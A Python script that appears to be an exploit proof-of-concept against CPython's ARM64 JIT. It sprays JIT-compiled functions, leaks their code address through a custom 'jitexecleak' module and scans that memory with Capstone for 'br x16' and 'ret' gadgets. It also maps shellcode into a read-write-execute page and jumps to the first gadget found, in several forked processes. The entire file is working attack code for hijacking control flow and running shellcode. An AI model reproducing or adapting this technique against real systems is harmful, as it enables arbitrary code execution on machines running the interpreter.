import ctypes
import mmap
import struct
import jitexecleak
from capstone import *
from multiprocessing import Process, set_start_method, current_process

PAGE_SIZE = 0x1000
SCAN_LEN = 0x2000

# ARM64 gadget patterns
GADGET_PATTERNS = [
    b'\x00\x02\x1f\xd6',  # br x16
    b'\xc0\x03\x5f\xd6',  # ret
]

# Load shellcode
with open("shellcode.bin", "rb") as f:
    shellcode = f.read()

# Allocate shellcode in RWX mmap
libc = ctypes.CDLL("libc.so.6")
libc.mmap.restype = ctypes.c_void_p
sc_addr = libc.mmap(None, PAGE_SIZE, 7, 0x22, -1, 0)
ctypes.memmove(sc_addr, shellcode, len(shellcode))
print(f"[+] Shellcode mmap @ 0x{sc_addr:x}")

# Spray function generator
def make_spray_func(magic):
    def spray(x):
        acc = x
        for i in range(20000):
            acc ^= (magic & i)
            acc += (acc << 1)
            acc |= (acc >> 2)
            acc &= 0x0F0F0F0F
        return acc
    return spray

# Capstone setup
md = Cs(CS_ARCH_ARM64, CS_MODE_ARM)
md.detail = True

def spray_and_jump(magic):
    pid = current_process().pid
    print(f"\n=== [PID {pid}] Running spray for magic: 0x{magic:08x} ===")
    spray_fn = make_spray_func(magic)

    for _ in range(6000):
        spray_fn(42)

    try:
        jit_addr = jitexecleak.leak_executor_jit(spray_fn)
        print(f"[0x{magic:08x}] executor->jit_code @ 0x{jit_addr:x}")
    except RuntimeError:
        print(f"[0x{magic:08x}] JIT failed.")
        return

    mem = ctypes.string_at(jit_addr, SCAN_LEN)

    # Capstone scan
    for i in md.disasm(mem, jit_addr):
        if i.mnemonic == "br" and "x16" in i.op_str:
            print(f"[GADGET] br x16 @ 0x{i.address:x}")
            shell_jump(i.address)
            return
        if i.mnemonic == "ret":
            print(f"[GADGET] ret @ 0x{i.address:x}")
            shell_jump(i.address)
            return

    # raw byte fallback
    for i in range(len(mem) - 4):
        chunk = mem[i:i+4]
        if chunk in GADGET_PATTERNS:
            addr = jit_addr + i
            print(f"[RAW-GADGET] {chunk.hex()} @ 0x{addr:x}")
            shell_jump(addr)
            return

    print(f"[-] No gadget found for magic: 0x{magic:08x}")

def shell_jump(addr):
    FUNC = ctypes.CFUNCTYPE(None)
    fn = FUNC(addr)
    print(f"[*] Jumping to gadget @ 0x{addr:x}")
    fn()

if __name__ == "__main__":
    try:
        set_start_method("fork")
    except RuntimeError:
        pass

    magic_values = [
        0x0000FFFF,
        0xFFFF0000,
        0xF0F0F0F0,
        0x0F0F0F0F,
        0xDEADBEEF,
        0xAAAAAAAA,
        0x55555555,
        0xFFFFFFFF,
    ]

    procs = []
    for magic in magic_values:
        p = Process(target=spray_and_jump, args=(magic,))
        p.start()
        procs.append(p)

    for p in procs:
        p.join()
